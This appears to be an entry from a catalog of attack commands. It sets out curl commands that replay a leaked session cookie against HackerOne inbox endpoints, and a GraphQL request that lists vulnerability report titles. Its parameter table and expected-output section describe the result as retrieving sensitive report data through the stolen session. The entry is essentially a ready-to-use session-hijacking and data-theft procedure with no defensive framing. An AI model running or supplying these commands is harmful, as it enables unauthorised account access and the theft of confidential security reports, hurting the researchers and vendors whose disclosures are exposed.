---
data: >-
  curl -H "Cookie: __session=leaked_cookie_value_here"
  https://hackerone.com/inbox/has
tags:
  - http
  - data-collection
  - graphql
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.531Z'
id: 9c46604c-be8d-4a4a-af54-941e55f0f92c
verified: false
validated: true
submitted: true
---
# curl-access-inbox

## Command

```bash
curl -H "Cookie: __session=leaked_cookie_value_here" https://hackerone.com/inbox/has
```

## Description

This command accesses a protected inbox endpoint on HackerOne using the session cookie to fetch sensitive report data, such as vulnerability titles and metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: ..."` | Authenticates with the leaked session | Yes |
| `https://hackerone.com/inbox/has` | Specific inbox URL (e.g., /inbox/has, /inbox/triage) | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: __session=abc123def456" https://hackerone.com/inbox/triage
```

### Advanced Usage

```bash
curl -H "Cookie: __session=abc123def456" -X POST https://hackerone.com/graphql -d '{"query":"{ reports(first:25) { edges { node { title } } } }"}'
```

## Expected Output

JSON or HTML response with report lists (e.g., array of objects containing title, description, comments). Up to 25-100 items depending on inbox.

## Related

- [[Related Procedure: Access-Sensitive-Information-via-Inboxes]]
